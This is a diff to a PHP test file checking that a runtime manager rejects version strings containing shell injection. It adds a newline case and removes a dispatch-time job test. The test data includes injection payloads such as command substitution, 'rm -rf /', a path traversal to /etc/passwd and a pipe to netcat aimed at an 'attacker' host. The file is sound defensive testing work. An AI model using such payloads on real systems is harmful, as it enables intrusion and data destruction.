@@ -3,7 +3,6 @@
 declare(strict_types=1);
 
 use App\Exceptions\InvalidRuntimeException;
-use App\Jobs\InstallRuntime;
 use App\Models\Server;
 use App\Services\Runtime\AsdfManager;
 use App\Services\SSH\SSHConnection;
@@ -26,6 +25,7 @@ test('a version carrying shell metacharacters is rejected', function (string $ve
     '8.5.5`id`',
     '8.5.5$(id)',
     "8.5.5\nrm -rf /",
+    "8.5.5\n",
     '../../../etc/passwd',
     '8.5.5 | nc attacker 1234',
 ])->throws(InvalidRuntimeException::class);
@@ -40,10 +40,6 @@ test('uninstall rejects the same injection attempts', function () {
     $connection = injectionConnection(new FakeSSHTransport);
 
     (new AsdfManager)->uninstall($connection, 'php', '8.5.5; touch /tmp/pwned');
-})->throws(InvalidRuntimeException::class);
-
-test('the job refuses bad input at dispatch time', function () {
-    new InstallRuntime(Server::factory()->create(), 'php', '8.5.5; touch /tmp/pwned');
 })->throws(InvalidRuntimeException::class);
 
 test('legitimate versions still pass validation', function (string $version) {
